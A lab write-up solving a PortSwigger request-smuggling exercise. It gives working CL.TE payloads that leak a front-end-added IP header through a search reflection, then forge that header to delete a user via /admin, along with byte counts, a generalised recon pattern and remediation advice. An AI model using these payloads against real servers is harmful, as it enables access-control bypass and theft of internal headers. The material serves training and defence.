# Lab 8: Exploiting HTTP request smuggling to reveal front-end request rewriting

**Category:** HTTP Request Smuggling
**Difficulty:** Practitioner
**Lab link:** [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

## Overview

The front-end adds a per-instance randomized `X-<random>-Ip: <client-IP>` header before forwarding. The back-end only serves `/admin` when that header equals `127.0.0.1`. We don't know the header name — so we **leak it** by smuggling a search request with an oversized `Content-Length`. The next real request's rewritten headers get absorbed as the search body, which the reflection endpoint echoes back to us. Then we forge the header on a second smuggle and delete carlos.

## Key Concepts

- **Front-end request rewriting is invisible to clients** — proxies silently add internal headers like `X-Real-IP`, `X-Forwarded-For`, trace IDs, authentication tokens.
- **Oversized smuggled `Content-Length` = reflection leak.** The smuggled request waits for N body bytes; the back-end eats them from the start of the next real request, which includes the rewritten headers.
- **Reflection endpoint = leak amplifier.** Any endpoint that echoes form data (search, comment preview, error messages) can be turned into a header-leak channel.
- **Two-step attack:** leak with step 1, exploit with step 2 (same CL.TE primitive, different smuggled payload).

## Burp Setup

- Repeater → Inspector → HTTP/1.
- Repeater menu → uncheck **Update Content-Length**.
- Body hex view → ends with `30 0D 0A 0D 0A` after the `0`.

## Solution

### Step 1 — Leak the rewrite header

Send twice:

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Second response is a search results page containing something like:

```
Search results for 'test
POST / HTTP/1.1
Host: LAB-ID...
X-abcdef-Ip: <your-ip>    ← leaked
...'
```

Copy the exact `X-<random>-Ip` header name.

### Step 2 — Delete carlos with the forged header

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-abcdef-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

Replace `X-abcdef-Ip` with the actual leaked name. Send twice → carlos deleted → lab solved.

## How the Leak Works

**Smuggled payload:** a POST to `/` with search body `search=test` (11 bytes) but `Content-Length: 200`.

**Back-end parses smuggled POST:** needs 200 body bytes. Has 11 parked. Reads 189 more bytes from the next incoming real request as the rest of the smuggled POST's body.

**Those 189 bytes are the real request's headers** — including `X-abcdef-Ip: <attacker-IP>` that the front-end just added. They become part of the `search` form value.

**Back-end processes the smuggled POST** → search endpoint reflects `search=test\nPOST / HTTP/1.1\nHost: ...\nX-abcdef-Ip: ...` back as the search results.

Attacker reads the leaked header name directly from the second response.

## Why `Connection: close` on the Smuggled Request

Stops the back-end from parsing anything after the smuggled request as a follow-up. Avoids pipeline confusion when the smuggled request's body ends mid-pipeline.

## Byte Counts

**Step 1 outer `Content-Length: 124`:**
```
0\r\n                                               = 3
\r\n                                                = 2
POST / HTTP/1.1\r\n                                 = 17
Content-Type: application/x-www-form-urlencoded\r\n = 49
Content-Length: 200\r\n                             = 21
Connection: close\r\n                               = 19
\r\n                                                = 2
search=test                                         = 11
----
                                                      124
```

**Step 2 outer `Content-Length: 166`:**
```
0\r\n                                               = 3
\r\n                                                = 2
GET /admin/delete?username=carlos HTTP/1.1\r\n      = 44
X-abcdef-Ip: 127.0.0.1\r\n                          = 24
Content-Type: application/x-www-form-urlencoded\r\n = 49
Content-Length: 10\r\n                              = 20
Connection: close\r\n                               = 19
\r\n                                                = 2
x=1                                                 = 3
----
                                                      166
```

Exact byte count depends on the leaked header name's length — recalculate if yours is longer/shorter than `X-abcdef-Ip`.

## Why It Worked

- Front-end trusts the client-provided headers it adds (`X-*-Ip`).
- Back-end trusts those headers as authentication/authorization markers.
- Smuggling lets the attacker both **read what the front-end adds** (via reflection + oversized CL) and **forge the same header** on a follow-up request.

## Real-World Generalization

Every real smuggling engagement starts with this reconnaissance pattern:

1. Find a reflection endpoint (search, comment preview, user profile echo, error message).
2. Smuggle a POST to it with oversized `Content-Length`.
3. Read the leaked front-end-added headers from the reflection.
4. Forge whichever header carries authorization or trust and smuggle the real attack.

Leakable targets include: JWTs attached by edge auth, trace IDs, source-IP markers, internal routing tokens, mTLS-derived user identity headers.

## Remediation

- Don't trust headers added by the front-end for authorization. Use authenticated internal mTLS or signed tokens that the back-end verifies.
- Strip and re-add trust-sensitive headers at every proxy hop so they can't survive smuggling.
- Reject requests with both `Content-Length` and `Transfer-Encoding` at the edge.
- Use HTTP/2 end-to-end.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-08-reveal-front-end-rewriting/solve.py)

Two-stage script. Raw TLS sockets. First stage leaks the header via oversized CL + search reflection; second stage uses the leaked name to smuggle the delete.

## Key Takeaways

- **Oversized smuggled `Content-Length` leaks downstream request headers via a reflection endpoint.** The single most useful recon primitive in request smuggling.
- **Any reflected form value is a leak channel.** Search, comment preview, error messages, user-profile echo.
- **Attacks on front-end-added trust markers are two-step:** leak the name/format first, forge second.
- **Front-end-added headers are not safe for authorization.** mTLS or signed internal tokens are the only durable fix.
